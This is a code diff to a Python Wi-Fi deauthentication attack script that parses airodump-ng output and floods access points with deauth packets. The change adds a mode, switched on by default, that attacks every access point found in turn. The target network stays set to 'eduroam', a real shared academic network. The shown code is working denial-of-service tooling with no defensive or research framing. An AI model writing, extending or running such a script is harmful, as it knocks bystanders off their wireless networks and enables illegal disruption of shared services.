@@ -167,12 +167,12 @@ def read_csv(directory, file_name):
 		print(powers)
 		return None
 
-def deauth_from_csv(file_dir, file_name, interface, num_pkts_to_send, target_essid=None):
+def deauth_from_csv(file_dir, file_name, interface, num_pkts_to_send, target_essid=None, attack_all=False):
 	"""
 	Read CSV file and execute deauth attack on target access point(s).
 	
 	This function parses the airodump CSV, filters valid targets, and executes
-	the deauth attack. Can target a specific ESSID or the strongest AP.
+	the deauth attack. Can target a specific ESSID or all networks.
 	
 	Args:
 		file_dir (str): Directory containing the CSV file
@@ -180,7 +180,8 @@ def deauth_from_csv(file_dir, file_name, interface, num_pkts_to_send, target_ess
 		interface (str): Wireless interface in monitor mode
 		num_pkts_to_send (int): Number of deauth packets to send per attack
 		target_essid (str): Specific network name to target (e.g., "eduroam")
-		                    If None, targets strongest signal
+		                    If None, targets all networks
+		attack_all (bool): If True, attack all found APs; if False, only strongest
 	
 	Returns:
 		None: Executes the attack and prints status information
@@ -227,24 +228,26 @@ def deauth_from_csv(file_dir, file_name, interface, num_pkts_to_send, target_ess
 				display_status("No APs", "Detected")
 		return
 
-	# Control flag: set to True to attack all APs, False to attack only one
-	deauth_all = False
-
-	if(deauth_all):
-		# Attack all detected APs (or all instances of target_essid)
-		# Sort by channels to minimize channel hopping (performance optimization)
-		my_list.sort(key=lambda x: x[1], reverse=True)
-
+	if attack_all:
+		# Attack all detected APs in sequence
+		print(f"Attacking {len(my_list)} access point(s)...")
+		
+		# Sort by signal strength (strongest first)
+		my_list.sort(key=lambda x: x[3])
+		
 		# Attack each AP in the list
-		for lst in my_list:
+		for idx, lst in enumerate(my_list, 1):
+			print(f"[{idx}/{len(my_list)}] Attacking {lst[2]} ({lst[0]})")
 			if LCD_AVAILABLE:
-				display_status("Attacking", lst[2][:16])
+				display_status(f"AP {idx}/{len(my_list)}", lst[2][:16])
 			deauth(interface, num_pkts_to_send, lst[0], lst[1], lst[2])
 	else:
-		# Attack only one AP - the strongest signal
+		# Attack only the strongest AP
 		# Sort by power (index 3) - strongest signal has highest value (least negative)
 		my_list.sort(key=lambda x: x[3])
 		lst = my_list[0]
+		
+		print(f"Attacking strongest: {lst[2]} ({lst[0]}) power: {lst[3]}")
 		
 		# Display target on LCD
 		if LCD_AVAILABLE:
@@ -408,9 +411,14 @@ deauth_max_seconds = 30           # Time between scans (unused in current implem
 
 # Target Configuration
 # Set to a specific network name (e.g., "eduroam") to target only that network
-# Set to None to target the strongest signal (any network)
+# Set to None to target all networks
 target_essid = "eduroam"          # Target network name (case-insensitive)
-                                   # Change to None for automatic strongest signal selection
+                                   # Change to None to attack all networks
+
+# Attack Mode
+# Set to True to attack all found networks/APs in sequence
+# Set to False to attack only the strongest signal
+attack_all_found = True           # True = attack all, False = strongest only
 
 # ============================================================================
 # Initialization
@@ -474,10 +482,31 @@ rm_csv(dump_dir)
 
 if LCD_AVAILABLE:
     if target_essid:
-        display_status("Target Set", target_essid[:16])
+        if attack_all_found:
+            display_status("Target: All", target_essid[:16])
+        else:
+            display_status("Target: 1", target_essid[:16])
     else:
-        display_status("Target Mode", "Strongest AP")
+        if attack_all_found:
+            display_status("Attack Mode", "All Networks")
+        else:
+            display_status("Attack Mode", "Strongest AP")
     time.sleep(2)
+
+# Print configuration summary
+print("\n" + "="*50)
+print("ATTACK CONFIGURATION")
+print("="*50)
+if target_essid:
+    print(f"Target Network: {target_essid}")
+else:
+    print("Target Network: All networks")
+if attack_all_found:
+    print("Attack Mode: ALL access points found")
+else:
+    print("Attack Mode: Strongest signal only")
+print(f"Packets per AP: {deauth_num_pkts}")
+print("="*50 + "\n")
 
 # Test airodump-ng before starting main loop
 print("\nTesting airodump-ng...")
@@ -561,7 +590,7 @@ while True:
 				display_status("Analyzing", "Networks...")
 		
 		date_start = datetime.datetime.now()
-		deauth_from_csv(dump_dir, latest_dump_csv_file_name, iface, deauth_num_pkts, target_essid)
+		deauth_from_csv(dump_dir, latest_dump_csv_file_name, iface, deauth_num_pkts, target_essid, attack_all_found)
 		
 		if LCD_AVAILABLE:
 			display_status("Loop Complete", f"#{loop_count}")
